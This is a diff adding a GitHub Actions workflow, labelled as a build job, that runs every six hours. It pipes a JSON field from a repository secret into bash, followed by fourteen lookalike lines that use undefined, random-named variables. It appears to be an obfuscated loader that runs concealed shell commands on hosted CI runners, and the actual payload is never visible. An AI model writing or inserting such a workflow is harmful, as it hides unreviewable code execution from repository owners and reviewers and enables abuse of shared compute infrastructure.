@@ -1,0 +1,31 @@
+name: weijiewen1987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weijiewen1987
+        env:
+          k2: ${{ secrets.k2 }}
+        run: |
+          echo $k2 | jq -r .mo26 | /bin/bash
+          echo $c9733 | jq -r .prh86182 | /bin/bash
+          echo $aoo244 | jq -r .dxv10 | /bin/bash
+          echo $zn44582 | jq -r .vwxje64 | /bin/bash
+          echo $kvcjh38 | jq -r .raz3 | /bin/bash
+          echo $xlykc64268 | jq -r .e4071 | /bin/bash
+          echo $zeet43426 | jq -r .njmfk07624 | /bin/bash
+          echo $thzui83 | jq -r .l50 | /bin/bash
+          echo $fqyd8 | jq -r .bcz4 | /bin/bash
+          echo $g50 | jq -r .gezu3803 | /bin/bash
+          echo $tqj65 | jq -r .bthau92 | /bin/bash
+          echo $jyz545 | jq -r .actdd66802 | /bin/bash
+          echo $fd37 | jq -r .kn1067 | /bin/bash
+          echo $okmp362 | jq -r .bwx2625 | /bin/bash
+          echo $zcz714 | jq -r .unhk94 | /bin/bash
+
